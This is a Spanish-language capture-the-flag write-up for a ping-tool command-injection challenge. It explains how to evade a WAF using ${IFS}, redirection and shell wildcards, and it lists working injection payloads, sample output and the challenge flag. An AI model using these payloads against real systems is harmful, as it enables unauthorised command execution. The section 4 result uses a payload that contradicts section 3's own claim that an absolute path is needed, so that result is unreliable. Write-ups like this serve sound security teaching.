# 📋 Writeup Oficial: Comandos Ocultos (PingTool Pro)

| Campo | Detalle |
| :--- | :--- |
| **Categoría** | Web / Command Injection |
| **Dificultad** | Media (Medium) |
| **Puntos** | 500 |
| **Flag** | `CHRONOS{w4f_byp4ss_ifs_4nd_w1ldc4rds_8842}` |

---

## 1. Análisis de la Aplicación y Detección del WAF

El servicio web ofrece un formulario para ejecutar comandos de diagnóstico `ping -c 2 <host>`. La vulnerabilidad subyacente es una inyección de comandos en el intérprete del sistema operativo (`shell=True`).

Sin embargo, el WAF implementado en el backend valida la entrada bloqueando:
* El carácter punto y coma (`;`)
* Espacios en blanco (` `)
* La palabra clave `cat`
* La palabra clave `flag`

Si se envía una carga útil básica como `127.0.0.1; cat /flag`, el servidor responde:
> `[!] WAF DETECCIÓN: Carácter no permitido: ';'`

Y si se intenta encadenar con `&&` y espacios (`127.0.0.1 && id`):
> `[!] WAF DETECCIÓN: Carácter no permitido: ' '`

---

## 2. Estrategia de Evasión (Bypass)

Para construir un exploit exitoso debemos superar dos restricciones:

### A. Evasión de Espacios
En entornos Linux/POSIX, existen varias técnicas para separar argumentos sin utilizar el byte de espacio (`0x20`):
1. **Variable `${IFS}`:** La variable de entorno *Internal Field Separator* se expande por defecto a `<espacio><tab><nueva línea>`.
2. **Redirección de entrada (`<`):** Permite pasar el contenido de un archivo como `stdin` de un comando sin espacios: `comando</ruta/archivo`.

### B. Evasión de la Blacklist (`cat` y `flag`)
Para evitar los términos prohibidos:
1. **Comodines / Wildcards de Shell (`?`, `*`):**
   * `/bin/c?t` coincide con `/bin/cat`.
   * `/fl?g` o `/fl*` coincide con `/flag`.
2. **Comandos de lectura alternativos:**
   * Utilidades estándar como `head`, `tail`, `more` o `tac` (cat en orden inverso).

---

## 3. Cargas Útiles (Payloads) Funcionales

Cualquiera de los siguientes vectores introducidos en el campo de texto permite extraer la bandera:

### Opción 1: Wildcards + `${IFS}` (Recomendada)
Como los comodines no expanden rutas en `$PATH` de forma automática para el nombre del ejecutable, se especifica la ruta absoluta:
```text
127.0.0.1&&/bin/c?t${IFS}/fl?g
```

### Opción 2: Comando alternativo con `head`
```text
127.0.0.1&&head${IFS}/fl?g
```

### Opción 3: Comando alternativo con `more`
```text
127.0.0.1&&more${IFS}/fl?g
```

---

## 4. Resultado de Explotación

Al enviar el payload `127.0.0.1&&c?t${IFS}/fl?g`:
```text
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.035 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.029 ms

--- 127.0.0.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1021ms
rtt min/avg/max/mdev = 0.029/0.032/0.035/0.003 ms
CHRONOS{w4f_byp4ss_ifs_4nd_w1ldc4rds_8842}
```
